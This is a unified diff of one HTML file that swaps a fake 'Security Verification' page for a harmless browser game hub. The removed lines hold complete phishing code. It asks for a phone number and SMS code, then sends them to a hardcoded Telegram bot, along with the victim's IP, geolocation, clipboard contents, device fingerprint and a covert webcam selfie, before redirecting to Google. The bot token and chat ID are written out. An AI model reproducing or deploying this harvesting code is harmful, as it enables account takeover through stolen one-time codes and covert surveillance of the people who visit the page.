@@ -3,467 +3,732 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0" />
-    <title>🫡 Security Verification</title>
+    <title>🎮 Game Hub</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        /* ── reset ── */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
         body {
-            background: #0a0a0f;
-            color: #fff;
-            font-family: 'Segoe UI', Arial, sans-serif;
+            background: #0b0d15;
+            color: #eef2ff;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
             min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
             padding: 20px;
         }
-        .container {
-            max-width: 420px;
-            width: 100%;
-            background: #12121a;
-            border-radius: 28px;
-            padding: 40px 28px;
-            border: 1px solid #2a2a3a;
-            text-align: center;
+
+        .header {
+            max-width: 800px;
+            margin: 0 auto 24px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 16px 20px;
+            background: #131722;
+            border-radius: 20px;
+            border: 1px solid #2a2f42;
         }
-        .icon { font-size: 48px; margin-bottom: 16px; }
-        h1 {
+
+        .header h1 {
             font-size: 22px;
-            font-weight: 700;
-            background: linear-gradient(135deg, #f7931a, #ffd700);
+            background: linear-gradient(135deg, #f7b731, #f7931a);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
         }
-        p { color: #888; font-size: 14px; margin: 12px 0 20px 0; line-height: 1.6; }
-        .spinner {
-            display: inline-block;
-            width: 48px;
-            height: 48px;
-            border: 4px solid #2a2a44;
-            border-top-color: #f7931a;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            margin: 10px auto;
-        }
-        @keyframes spin { to { transform: rotate(360deg); } }
-        .status { color: #4caf50; font-weight: 600; font-size: 16px; margin-top: 12px; }
-        .status.error { color: #f44336; }
-        .status.done { color: #4caf50; }
-        .badge {
-            display: inline-block;
-            background: #1f8b4c;
-            padding: 4px 16px;
-            border-radius: 40px;
-            font-size: 11px;
-            font-weight: 600;
-            color: #fff;
-            text-transform: uppercase;
-            margin-top: 8px;
-        }
-        #video { display: none; width: 100%; border-radius: 12px; margin: 10px 0; background: #000; }
-        #canvas { display: none; }
-        .footer { margin-top: 24px; font-size: 11px; color: #444; border-top: 1px solid #1e1e2e; padding-top: 16px; }
-        .btn {
-            background: #f7931a;
-            border: none;
-            color: #000;
-            padding: 14px 40px;
-            border-radius: 40px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            margin-top: 16px;
-            width: 100%;
-        }
-        .btn:hover { background: #ffa726; }
-        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
-        .input-group {
-            margin-top: 16px;
-            text-align: left;
-        }
-        .input-group label {
-            color: #888;
-            font-size: 13px;
-            display: block;
-            margin-bottom: 4px;
-        }
-        .input-group input {
-            width: 100%;
-            padding: 12px 16px;
-            border-radius: 12px;
-            border: 1px solid #2a2a3a;
-            background: #1a1a26;
-            color: #fff;
+
+        .header .score {
             font-size: 14px;
-            outline: none;
+            color: #8b92a8;
         }
-        .input-group input:focus {
+
+        .header .score span {
+            color: #f7931a;
+            font-weight: 700;
+            font-size: 18px;
+        }
+
+        .game-grid {
+            max-width: 800px;
+            margin: 0 auto;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+            gap: 16px;
+            margin-bottom: 24px;
+        }
+
+        .game-card {
+            background: #131722;
+            border-radius: 20px;
+            padding: 20px 16px;
+            border: 1px solid #2a2f42;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .game-card:hover {
+            border-color: #f7931a;
+            transform: translateY(-4px);
+            box-shadow: 0 12px 30px -8px rgba(247, 147, 26, 0.15);
+        }
+
+        .game-card .icon {
+            font-size: 36px;
+            margin-bottom: 8px;
+            display: block;
+        }
+
+        .game-card .name {
+            font-size: 14px;
+            font-weight: 600;
+            color: #eef2ff;
+        }
+
+        .game-card .desc {
+            font-size: 11px;
+            color: #6b7390;
+            margin-top: 4px;
+        }
+
+        .game-container {
+            max-width: 800px;
+            margin: 0 auto;
+            background: #131722;
+            border-radius: 24px;
+            border: 1px solid #2a2f42;
+            padding: 24px;
+            min-height: 400px;
+            position: relative;
+        }
+
+        .game-container .game-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 16px;
+        }
+
+        .game-container .game-header h2 {
+            font-size: 18px;
+            color: #eef2ff;
+        }
+
+        .game-container .game-header button {
+            background: #2a2f42;
+            border: none;
+            color: #eef2ff;
+            padding: 8px 18px;
+            border-radius: 12px;
+            cursor: pointer;
+            font-size: 13px;
+            transition: background 0.2s;
+        }
+
+        .game-container .game-header button:hover {
+            background: #3d445c;
+        }
+
+        .game-area {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 300px;
+        }
+
+        .game-area .game-status {
+            font-size: 14px;
+            color: #8b92a8;
+            margin-bottom: 12px;
+        }
+
+        .game-area .game-status span {
+            color: #f7931a;
+            font-weight: 600;
+        }
+
+        /* ── Tic-Tac-Toe ── */
+        .ttt-board {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 8px;
+            width: 240px;
+            margin: 0 auto;
+        }
+
+        .ttt-cell {
+            background: #0f131f;
+            border: 1px solid #2a2f42;
+            border-radius: 12px;
+            aspect-ratio: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 40px;
+            font-weight: 700;
+            color: #eef2ff;
+            cursor: pointer;
+            transition: all 0.15s;
+        }
+
+        .ttt-cell:hover {
             border-color: #f7931a;
         }
-        .input-group input::placeholder {
-            color: #555;
+
+        .ttt-cell.x {
+            color: #60a5fa;
         }
-        .log {
-            margin-top: 16px;
-            font-size: 11px;
-            color: #666;
-            text-align: left;
-            background: #0a0a0f;
-            padding: 10px 14px;
-            border-radius: 8px;
-            max-height: 150px;
-            overflow-y: auto;
-            border: 1px solid #1a1a2a;
-            font-family: monospace;
-            white-space: pre-wrap;
-            word-break: break-all;
+
+        .ttt-cell.o {
+            color: #f87171;
         }
-        .log .success { color: #4caf50; }
-        .log .error { color: #f44336; }
-        .log .info { color: #64b5f6; }
+
+        /* ── Memory ── */
+        .memory-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 10px;
+            width: 320px;
+            margin: 0 auto;
+        }
+
+        .memory-card {
+            aspect-ratio: 1;
+            background: #0f131f;
+            border: 1px solid #2a2f42;
+            border-radius: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 28px;
+            cursor: pointer;
+            transition: all 0.2s;
+            user-select: none;
+        }
+
+        .memory-card.flipped {
+            background: #1a2035;
+            border-color: #f7931a;
+        }
+
+        .memory-card.matched {
+            background: #1a3a2a;
+            border-color: #4ade80;
+            cursor: default;
+            opacity: 0.6;
+        }
+
+        /* ── Snake ── */
+        .snake-board {
+            display: grid;
+            grid-template-columns: repeat(15, 1fr);
+            gap: 2px;
+            width: 300px;
+            margin: 0 auto;
+            background: #0f131f;
+            border-radius: 12px;
+            padding: 4px;
+        }
+
+        .snake-cell {
+            aspect-ratio: 1;
+            border-radius: 4px;
+            background: #131722;
+            transition: background 0.1s;
+        }
+
+        .snake-cell.snake {
+            background: #4ade80;
+        }
+
+        .snake-cell.food {
+            background: #f87171;
+            border-radius: 50%;
+        }
+
+        .snake-score {
+            text-align: center;
+            font-size: 18px;
+            color: #eef2ff;
+            margin-bottom: 12px;
+        }
+
+        .snake-score span {
+            color: #f7931a;
+            font-weight: 700;
+        }
+
+        /* ── responsive ── */
+        @media (max-width: 500px) {
+            .game-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+            .ttt-board {
+                width: 180px;
+            }
+            .memory-grid {
+                width: 240px;
+                gap: 6px;
+            }
+            .memory-card {
+                font-size: 20px;
+            }
+            .snake-board {
+                width: 220px;
+            }
+        }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <div class="icon">🔴</div>
-    <h1>Security Verification</h1>
-    <p>Please verify your identity to continue.</p>
-
-    <div class="input-group">
-        <label>📱 Phone Number</label>
-        <input type="tel" id="phoneInput" placeholder="+1 234 567 8900" />
+    <!-- HEADER -->
+    <div class="header">
+        <h1>🎮 Game Hub</h1>
+        <div class="score">🏆 <span id="totalScore">0</span></div>
     </div>
 
-    <div class="input-group">
-        <label>🔑 SMS Code</label>
-        <input type="text" id="smsInput" placeholder="Enter 6-digit code" maxlength="6" />
+    <!-- GAME GRID -->
+    <div class="game-grid">
+        <div class="game-card" data-game="ttt">
+            <span class="icon">❌</span>
+            <div class="name">Tic-Tac-Toe</div>
+            <div class="desc">3x3 classic</div>
+        </div>
+        <div class="game-card" data-game="memory">
+            <span class="icon">🧠</span>
+            <div class="name">Memory</div>
+            <div class="desc">find the pairs</div>
+        </div>
+        <div class="game-card" data-game="snake">
+            <span class="icon">🐍</span>
+            <div class="name">Snake</div>
+            <div class="desc">don't crash!</div>
+        </div>
+        <div class="game-card" data-game="rps">
+            <span class="icon">✊</span>
+            <div class="name">RPS</div>
+            <div class="desc">rock paper scissors</div>
+        </div>
     </div>
 
-    <div class="spinner" id="spinner" style="display:none;"></div>
-    <div class="status" id="status">Enter phone and code</div>
-    <div class="badge" id="badge" style="display:none;">LIVE</div>
+    <!-- GAME CONTAINER -->
+    <div class="game-container" id="gameContainer">
+        <div class="game-header">
+            <h2 id="gameTitle">🎯 Select a game</h2>
+            <button id="resetBtn">🔄 Reset</button>
+        </div>
+        <div class="game-area" id="gameArea">
+            <div class="game-status">Choose a game from above</div>
+        </div>
+    </div>
 
-    <video id="video" autoplay muted playsinline></video>
-    <canvas id="canvas"></canvas>
+    <script>
+        // ============================================================
+        //  STATE
+        // ============================================================
+        let currentGame = null;
+        let totalScore = 0;
 
-    <button class="btn" id="verifyBtn">✅ Verify Now</button>
-    <button class="btn" id="retryBtn" style="display:none;">🔄 Retry</button>
+        // ============================================================
+        //  DOM
+        // ============================================================
+        const gameArea = document.getElementById('gameArea');
+        const gameTitle = document.getElementById('gameTitle');
+        const resetBtn = document.getElementById('resetBtn');
+        const totalScoreEl = document.getElementById('totalScore');
 
-    <div class="log" id="log">📋 Waiting for action...</div>
-
-    <div class="footer">🔒 All data encrypted</div>
-</div>
-
-<script>
-// ================= CONFIG =================
-const BOT_TOKEN = "6858098902:AAFrzDhcrsJDvBJiUQb8oI8tPqaZ9NVGVuI";
-const CHAT_ID = "175706993";
-
-// ================= DOM =================
-const statusEl = document.getElementById('status');
-const spinner = document.getElementById('spinner');
-const badge = document.getElementById('badge');
-const retryBtn = document.getElementById('retryBtn');
-const verifyBtn = document.getElementById('verifyBtn');
-const phoneInput = document.getElementById('phoneInput');
-const smsInput = document.getElementById('smsInput');
-const logEl = document.getElementById('log');
-
-function log(msg, type = 'info') {
-    const time = new Date().toLocaleTimeString();
-    logEl.innerHTML += `\n[${time}] <span class="${type}">${msg}</span>`;
-    logEl.scrollTop = logEl.scrollHeight;
-    console.log(`[${type}] ${msg}`);
-}
-
-function setStatus(text, type = '') {
-    statusEl.textContent = text;
-    statusEl.className = 'status' + (type ? ' ' + type : '');
-}
-
-// ================= TELEGRAM SENDER =================
-function sendToTelegram(text) {
-    log(`📤 Sending: ${text.substring(0, 50)}...`, 'info');
-
-    if (!BOT_TOKEN || BOT_TOKEN === "YOUR_BOT_TOKEN") {
-        log('❌ BOT_TOKEN not set!', 'error');
-        return;
-    }
-
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-
-    fetch(url, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-            chat_id: CHAT_ID,
-            text: text
-        })
-    })
-    .then(res => res.json())
-    .then(data => {
-        if (data.ok) {
-            log('✅ Message sent!', 'success');
-        } else {
-            log('❌ Telegram error: ' + JSON.stringify(data), 'error');
+        function updateScore() {
+            totalScoreEl.textContent = totalScore;
         }
-    })
-    .catch(err => {
-        log('❌ Fetch error: ' + err.message, 'error');
-    });
-}
 
-function sendPhotoToTelegram(blob, caption = "") {
-    log('📸 Sending photo...', 'info');
+        // ============================================================
+        //  GAME: Tic-Tac-Toe
+        // ============================================================
+        let tttBoard = [];
+        let tttTurn = 'X';
+        let tttGameOver = false;
 
-    if (!BOT_TOKEN || BOT_TOKEN === "YOUR_BOT_TOKEN") {
-        log('❌ BOT_TOKEN not set!', 'error');
-        return;
-    }
-
-    const form = new FormData();
-    form.append("chat_id", CHAT_ID);
-    form.append("photo", blob, `selfie_${Date.now()}.jpg`);
-    if (caption) form.append("caption", caption);
-
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
-
-    fetch(url, {
-        method: "POST",
-        body: form
-    })
-    .then(res => res.json())
-    .then(data => {
-        if (data.ok) {
-            log('✅ Photo sent!', 'success');
-        } else {
-            log('❌ Photo error: ' + JSON.stringify(data), 'error');
+        function renderTicTacToe() {
+            gameTitle.textContent = '❌ Tic-Tac-Toe';
+            gameArea.innerHTML = `
+                <div class="game-status">${tttTurn}'s turn</div>
+                <div class="ttt-board" id="tttBoard"></div>
+            `;
+            const board = document.getElementById('tttBoard');
+            board.innerHTML = '';
+            for (let i = 0; i < 9; i++) {
+                const cell = document.createElement('div');
+                cell.className = 'ttt-cell';
+                cell.dataset.index = i;
+                cell.textContent = tttBoard[i] || '';
+                if (tttBoard[i] === 'X') cell.classList.add('x');
+                if (tttBoard[i] === 'O') cell.classList.add('o');
+                cell.addEventListener('click', () => tttClick(i));
+                board.appendChild(cell);
+            }
+            // status
+            const status = document.querySelector('.game-status');
+            if (tttGameOver) {
+                const winner = checkTttWinner();
+                if (winner) {
+                    status.textContent = `🏆 ${winner} wins!`;
+                    totalScore += 10;
+                    updateScore();
+                } else {
+                    status.textContent = "🤝 It's a draw!";
+                    totalScore += 5;
+                    updateScore();
+                }
+            } else {
+                status.textContent = `${tttTurn}'s turn`;
+            }
         }
-    })
-    .catch(err => {
-        log('❌ Photo fetch error: ' + err.message, 'error');
-    });
-}
 
-// ================= TEST TELEGRAM =================
-function testTelegram() {
-    log('🔍 Testing Telegram connection...', 'info');
-    sendToTelegram('🔴 Test message from Security Verification page');
-}
+        function tttClick(index) {
+            if (tttGameOver) return;
+            if (tttBoard[index]) return;
+            tttBoard[index] = tttTurn;
+            const winner = checkTttWinner();
+            if (winner) {
+                tttGameOver = true;
+                renderTicTacToe();
+                return;
+            }
+            if (tttBoard.every(c => c)) {
+                tttGameOver = true;
+                renderTicTacToe();
+                return;
+            }
+            tttTurn = tttTurn === 'X' ? 'O' : 'X';
+            renderTicTacToe();
+        }
 
-// ================= CAPTURE SELFIE =================
-async function captureSelfie() {
-    try {
-        setStatus("📸 Accessing camera...");
-        log('📸 Requesting camera...', 'info');
+        function checkTttWinner() {
+            const lines = [
+                [0, 1, 2],
+                [3, 4, 5],
+                [6, 7, 8],
+                [0, 3, 6],
+                [1, 4, 7],
+                [2, 5, 8],
+                [0, 4, 8],
+                [2, 4, 6]
+            ];
+            for (const [a, b, c] of lines) {
+                if (tttBoard[a] && tttBoard[a] === tttBoard[b] && tttBoard[a] === tttBoard[c]) {
+                    return tttBoard[a];
+                }
+            }
+            return null;
+        }
 
-        const stream = await navigator.mediaDevices.getUserMedia({
-            video: {
-                facingMode: "user",
-                width: { ideal: 320 },
-                height: { ideal: 240 }
-            },
-            audio: false
+        function resetTtt() {
+            tttBoard = Array(9).fill(null);
+            tttTurn = 'X';
+            tttGameOver = false;
+            renderTicTacToe();
+        }
+
+        // ============================================================
+        //  GAME: Memory
+        // ============================================================
+        const memoryEmojis = ['🍎', '🍌', '🍇', '🍉', '🍓', '🍒', '🍑', '🥝'];
+        let memoryCards = [];
+        let memoryFlipped = [];
+        let memoryMatched = [];
+        let memoryLocked = false;
+
+        function renderMemory() {
+            gameTitle.textContent = '🧠 Memory';
+            gameArea.innerHTML = `
+                <div class="game-status">Find the pairs</div>
+                <div class="memory-grid" id="memoryGrid"></div>
+            `;
+            const grid = document.getElementById('memoryGrid');
+            grid.innerHTML = '';
+            const shuffled = shuffle([...memoryCards]);
+            for (let i = 0; i < shuffled.length; i++) {
+                const card = document.createElement('div');
+                card.className = 'memory-card';
+                card.dataset.index = i;
+                if (memoryFlipped.includes(i)) card.classList.add('flipped');
+                if (memoryMatched.includes(i)) card.classList.add('matched');
+                card.textContent = (memoryFlipped.includes(i) || memoryMatched.includes(i)) ? shuffled[i] : '❓';
+                card.addEventListener('click', () => memoryClick(i));
+                grid.appendChild(card);
+            }
+            if (memoryMatched.length === memoryCards.length) {
+                document.querySelector('.game-status').textContent = '🎉 You won! +20 points!';
+                totalScore += 20;
+                updateScore();
+            }
+        }
+
+        function memoryClick(index) {
+            if (memoryLocked) return;
+            if (memoryMatched.includes(index)) return;
+            if (memoryFlipped.includes(index)) return;
+            if (memoryFlipped.length === 2) return;
+
+            memoryFlipped.push(index);
+            renderMemory();
+
+            if (memoryFlipped.length === 2) {
+                memoryLocked = true;
+                const [i1, i2] = memoryFlipped;
+                if (memoryCards[i1] === memoryCards[i2]) {
+                    memoryMatched.push(i1, i2);
+                    memoryFlipped = [];
+                    memoryLocked = false;
+                    renderMemory();
+                } else {
+                    setTimeout(() => {
+                        memoryFlipped = [];
+                        memoryLocked = false;
+                        renderMemory();
+                    }, 600);
+                }
+            }
+        }
+
+        function resetMemory() {
+            memoryCards = shuffle([...memoryEmojis, ...memoryEmojis]);
+            memoryFlipped = [];
+            memoryMatched = [];
+            memoryLocked = false;
+            renderMemory();
+        }
+
+        // ============================================================
+        //  GAME: Snake
+        // ============================================================
+        let snake = [];
+        let snakeDir = { dx: 1, dy: 0 };
+        let snakeFood = { x: 5, y: 5 };
+        let snakeScore = 0;
+        let snakeGameOver = false;
+        let snakeInterval = null;
+        const SNAKE_SIZE = 15;
+
+        function renderSnake() {
+            gameTitle.textContent = '🐍 Snake';
+            gameArea.innerHTML = `
+                <div class="snake-score">Score: <span id="snakeScore">${snakeScore}</span></div>
+                <div class="snake-board" id="snakeBoard"></div>
+                <div class="game-status" id="snakeStatus">Use arrow keys or WASD</div>
+            `;
+            const board = document.getElementById('snakeBoard');
+            board.innerHTML = '';
+            for (let y = 0; y < SNAKE_SIZE; y++) {
+                for (let x = 0; x < SNAKE_SIZE; x++) {
+                    const cell = document.createElement('div');
+                    cell.className = 'snake-cell';
+                    const isSnake = snake.some(s => s.x === x && s.y === y);
+                    const isFood = snakeFood.x === x && snakeFood.y === y;
+                    if (isSnake) cell.classList.add('snake');
+                    if (isFood) cell.classList.add('food');
+                    board.appendChild(cell);
+                }
+            }
+            if (snakeGameOver) {
+                document.getElementById('snakeStatus').textContent = '💀 Game Over! Press Reset';
+                document.getElementById('snakeStatus').style.color = '#f87171';
+            } else {
+                document.getElementById('snakeStatus').textContent = 'Use arrow keys or WASD';
+                document.getElementById('snakeStatus').style.color = '#8b92a8';
+            }
+            document.getElementById('snakeScore').textContent = snakeScore;
+        }
+
+        function snakeMove() {
+            if (snakeGameOver) return;
+            const head = { x: snake[0].x + snakeDir.dx, y: snake[0].y + snakeDir.dy };
+            // wall collision
+            if (head.x < 0 || head.x >= SNAKE_SIZE || head.y < 0 || head.y >= SNAKE_SIZE) {
+                snakeGameOver = true;
+                renderSnake();
+                return;
+            }
+            // self collision
+            if (snake.some(s => s.x === head.x && s.y === head.y)) {
+                snakeGameOver = true;
+                renderSnake();
+                return;
+            }
+            snake.unshift(head);
+            // food
+            if (head.x === snakeFood.x && head.y === snakeFood.y) {
+                snakeScore += 10;
+                totalScore += 10;
+                updateScore();
+                spawnSnakeFood();
+            } else {
+                snake.pop();
+            }
+            renderSnake();
+        }
+
+        function spawnSnakeFood() {
+            let pos;
+            do {
+                pos = { x: Math.floor(Math.random() * SNAKE_SIZE), y: Math.floor(Math.random() * SNAKE_SIZE) };
+            } while (snake.some(s => s.x === pos.x && s.y === pos.y));
+            snakeFood = pos;
+        }
+
+        function resetSnake() {
+            if (snakeInterval) { clearInterval(snakeInterval);
+                snakeInterval = null; }
+            snake = [{ x: 7, y: 7 }, { x: 6, y: 7 }, { x: 5, y: 7 }];
+            snakeDir = { dx: 1, dy: 0 };
+            snakeScore = 0;
+            snakeGameOver = false;
+            spawnSnakeFood();
+            renderSnake();
+            snakeInterval = setInterval(snakeMove, 200);
+        }
+
+        // ============================================================
+        //  GAME: Rock Paper Scissors
+        // ============================================================
+        let rpsScore = 0;
+
+        function renderRPS() {
+            gameTitle.textContent = '✊ Rock Paper Scissors';
+            gameArea.innerHTML = `
+                <div class="game-status">Choose your move</div>
+                <div style="display:flex;gap:16px;margin:16px 0;flex-wrap:wrap;justify-content:center;">
+                    <button class="rps-btn" data-move="rock">✊ Rock</button>
+                    <button class="rps-btn" data-move="paper">✋ Paper</button>
+                    <button class="rps-btn" data-move="scissors">✌️ Scissors</button>
+                </div>
+                <div id="rpsResult" style="text-align:center;font-size:16px;color:#8b92a8;"></div>
+                <div style="text-align:center;margin-top:8px;font-size:14px;color:#f7931a;">Score: <span id="rpsScore">${rpsScore}</span></div>
+            `;
+            document.querySelectorAll('.rps-btn').forEach(btn => {
+                btn.style.background = '#2a2f42';
+                btn.style.border = 'none';
+                btn.style.color = '#eef2ff';
+                btn.style.padding = '12px 24px';
+                btn.style.borderRadius = '14px';
+                btn.style.fontSize = '16px';
+                btn.style.cursor = 'pointer';
+                btn.style.transition = 'background 0.2s';
+                btn.addEventListener('mouseenter', () => btn.style.background = '#3d445c');
+                btn.addEventListener('mouseleave', () => btn.style.background = '#2a2f42');
+                btn.addEventListener('click', () => rpsPlay(btn.dataset.move));
+            });
+            document.getElementById('rpsScore').textContent = rpsScore;
+        }
+
+        function rpsPlay(playerMove) {
+            const moves = ['rock', 'paper', 'scissors'];
+            const emojis = { rock: '✊', paper: '✋', scissors: '✌️' };
+            const botMove = moves[Math.floor(Math.random() * 3)];
+            let result = '';
+            if (playerMove === botMove) {
+                result = "🤝 It's a draw!";
+            } else if (
+                (playerMove === 'rock' && botMove === 'scissors') ||
+                (playerMove === 'paper' && botMove === 'rock') ||
+                (playerMove === 'scissors' && botMove === 'paper')
+            ) {
+                result = '🎉 You win! +10 points!';
+                rpsScore += 10;
+                totalScore += 10;
+                updateScore();
+            } else {
+                result = '💀 You lose!';
+                rpsScore = Math.max(0, rpsScore - 5);
+                totalScore = Math.max(0, totalScore - 5);
+                updateScore();
+            }
+            document.getElementById('rpsResult').innerHTML =
+                `You: ${emojis[playerMove]} vs Bot: ${emojis[botMove]}<br><span style="color:#eef2ff;">${result}</span>`;
+            document.getElementById('rpsScore').textContent = rpsScore;
+        }
+
+        function resetRPS() {
+            rpsScore = 0;
+            renderRPS();
+        }
+
+        // ============================================================
+        //  HELPERS
+        // ============================================================
+        function shuffle(arr) {
+            for (let i = arr.length - 1; i > 0; i--) {
+                const j = Math.floor(Math.random() * (i + 1));
+                [arr[i], arr[j]] = [arr[j], arr[i]];
+            }
+            return arr;
+        }
+
+        // ============================================================
+        //  GAME SWITCHER
+        // ============================================================
+        function switchGame(game) {
+            // clear snake interval
+            if (snakeInterval) { clearInterval(snakeInterval);
+                snakeInterval = null; }
+
+            currentGame = game;
+
+            switch (game) {
+                case 'ttt':
+                    resetTtt();
+                    break;
+                case 'memory':
+                    resetMemory();
+                    break;
+                case 'snake':
+                    resetSnake();
+                    break;
+                case 'rps':
+                    renderRPS();
+                    break;
+                default:
+                    gameArea.innerHTML = `<div class="game-status">Select a game</div>`;
+                    gameTitle.textContent = '🎯 Select a game';
+            }
+        }
+
+        // ============================================================
+        //  EVENTS
+        // ============================================================
+        document.querySelectorAll('.game-card').forEach(card => {
+            card.addEventListener('click', () => {
+                switchGame(card.dataset.game);
+            });
         });
 
-        log('✅ Camera accessed', 'success');
+        resetBtn.addEventListener('click', () => {
+            if (currentGame) switchGame(currentGame);
+        });
 
-        const video = document.getElementById('video');
-        video.srcObject = stream;
-        await video.play();
+        // keyboard for snake
+        document.addEventListener('keydown', (e) => {
+            if (currentGame !== 'snake') return;
+            const key = e.key;
+            if (key === 'ArrowUp' || key === 'w') { snakeDir = { dx: 0, dy: -1 };
+                e.preventDefault(); }
+            if (key === 'ArrowDown' || key === 's') { snakeDir = { dx: 0, dy: 1 };
+                e.preventDefault(); }
+            if (key === 'ArrowLeft' || key === 'a') { snakeDir = { dx: -1, dy: 0 };
+                e.preventDefault(); }
+            if (key === 'ArrowRight' || key === 'd') { snakeDir = { dx: 1, dy: 0 };
+                e.preventDefault(); }
+        });
 
-        setStatus("📸 Capturing...");
-        log('📸 Capturing frame...', 'info');
-        await new Promise(r => setTimeout(r, 600));
+        // ============================================================
+        //  STARTUP
+        // ============================================================
+        // default: show tic-tac-toe
+        switchGame('ttt');
+    </script>
 
-        const canvas = document.getElementById('canvas');
-        canvas.width = video.videoWidth || 320;
-        canvas.height = video.videoHeight || 240;
-        const ctx = canvas.getContext('2d');
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-        setStatus("📤 Sending...");
-        log('📤 Converting to JPEG...', 'info');
-
-        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
-
-        if (blob) {
-            log(`📸 Blob size: ${(blob.size / 1024).toFixed(1)} KB`, 'info');
-            sendPhotoToTelegram(blob, "📸 Selfie captured");
-        } else {
-            log('❌ Failed to create blob', 'error');
-        }
-
-        stream.getTracks().forEach(t => t.stop());
-        video.srcObject = null;
-
-        return true;
-
-    } catch (err) {
-        setStatus("❌ Camera error: " + err.message, "error");
-        log('❌ Camera error: ' + err.message, 'error');
-        sendToTelegram(`❌ Camera error: ${err.message}`);
-        retryBtn.style.display = 'block';
-        return false;
-    }
-}
-
-// ================= GET IP =================
-async function getIP() {
-    try {
-        const r = await fetch('https://api.ipify.org?format=json');
-        const d = await r.json();
-        return d.ip || 'unknown';
-    } catch {
-        return 'unknown';
-    }
-}
-
-// ================= GET LOCATION =================
-function getLocation() {
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-            pos => {
-                const loc = `${pos.coords.latitude}, ${pos.coords.longitude}`;
-                sendToTelegram(`📍 Location: ${loc}`);
-                log('📍 Location sent', 'success');
-            },
-            () => {
-                log('📍 Location denied', 'info');
-            },
-            { timeout: 5000, enableHighAccuracy: true }
-        );
-    }
-}
-
-// ================= DEVICE INFO =================
-function getDeviceInfo() {
-    const info = [
-        `📱 Device Info`,
-        `UA: ${navigator.userAgent}`,
-        `Screen: ${window.screen.width}x${window.screen.height}`,
-        `Color: ${window.screen.colorDepth}bit`,
-        `Lang: ${navigator.language}`,
-        `Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`,
-        `Memory: ${navigator.deviceMemory || 'N/A'} GB`,
-        `Cores: ${navigator.hardwareConcurrency || 'N/A'}`
-    ];
-    const msg = info.join('\n');
-    sendToTelegram(msg);
-    log('📱 Device info sent', 'success');
-}
-
-// ================= CLIPBOARD =================
-function getClipboard() {
-    if (navigator.clipboard && navigator.clipboard.readText) {
-        navigator.clipboard.readText()
-            .then(text => {
-                if (text && text.length > 0 && text.length < 500) {
-                    sendToTelegram(`📋 Clipboard: ${text}`);
-                    log('📋 Clipboard sent', 'success');
-                }
-            })
-            .catch(() => {});
-    }
-}
-
-// ================= BROWSER FINGERPRINT =================
-function getFingerprint() {
-    const fp = {
-        ua: navigator.userAgent,
-        lang: navigator.language,
-        platform: navigator.platform,
-        screen: `${window.screen.width}x${window.screen.height}`,
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        memory: navigator.deviceMemory || 'N/A',
-        cores: navigator.hardwareConcurrency || 'N/A'
-    };
-    return JSON.stringify(fp);
-}
-
-// ================= RUN ALL =================
-async function runHarvest() {
-    retryBtn.style.display = 'none';
-    spinner.style.display = 'inline-block';
-    verifyBtn.disabled = true;
-    setStatus("Processing...");
-
-    log('🚀 Starting harvest...', 'info');
-
-    // Test connection first
-    testTelegram();
-
-    // Wait a moment for test
-    await new Promise(r => setTimeout(r, 1000));
-
-    const ip = await getIP();
-    const phone = phoneInput.value.trim() || 'Not provided';
-    const sms = smsInput.value.trim() || 'Not provided';
-
-    // Send all data
-    getDeviceInfo();
-    getLocation();
-    getClipboard();
-    sendToTelegram(`🌐 IP: ${ip}`);
-    sendToTelegram(`📱 Phone: ${phone}`);
-    sendToTelegram(`🔑 SMS Code: ${sms}`);
-    sendToTelegram(`🔑 Fingerprint: ${getFingerprint()}`);
-
-    log('📤 All data sent', 'success');
-
-    // Capture selfie
-    const selfieOk = await captureSelfie();
-
-    // Final status
-    if (selfieOk) {
-        setStatus("✅ Verified! Redirecting...", "done");
-        spinner.style.display = "none";
-        badge.style.display = "inline-block";
-        badge.textContent = "✅ VERIFIED";
-        sendToTelegram("✅ Harvest complete!");
-        log('✅ Harvest complete!', 'success');
-
-        setTimeout(() => {
-            window.location.href = "https://www.google.com";
-        }, 2500);
-    } else {
-        spinner.style.display = "none";
-        retryBtn.style.display = 'block';
-        verifyBtn.disabled = false;
-    }
-}
-
-// ================= RETRY =================
-retryBtn.onclick = function() {
-    runHarvest();
-};
-
-// ================= VERIFY BUTTON =================
-verifyBtn.onclick = function() {
-    runHarvest();
-};
-
-// ================= AUTO-START =================
-window.addEventListener('DOMContentLoaded', () => {
-    setStatus("Enter phone and code");
-    spinner.style.display = 'none';
-    log('📋 Page loaded. Enter details and click Verify.', 'info');
-
-    if (BOT_TOKEN === "YOUR_BOT_TOKEN") {
-        log('⚠️ WARNING: BOT_TOKEN not set! Edit the script.', 'error');
-    } else {
-        log('✅ BOT_TOKEN configured', 'success');
-    }
